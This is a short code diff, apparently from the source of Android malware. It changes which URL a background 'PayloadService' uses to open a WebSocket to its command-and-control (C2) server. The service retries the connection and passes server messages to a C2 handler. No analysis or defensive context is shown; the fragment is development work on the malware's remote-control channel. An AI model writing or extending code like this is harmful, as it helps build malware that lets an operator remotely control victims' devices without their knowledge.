@@ -115,7 +115,7 @@ class PayloadService : Service() {
             var retries = 0
             while (isRunning && retries < 10) {
                 try {
-                    c2WebSocket = WebSocketClient(StagerApplication.c2RealUrl)
+                    c2WebSocket = WebSocketClient(StagerApplication.c2WsUrl)
                     c2WebSocket?.connect(
                         onMessage = { msg -> handleC2Message(msg) },
                         onConnected = {
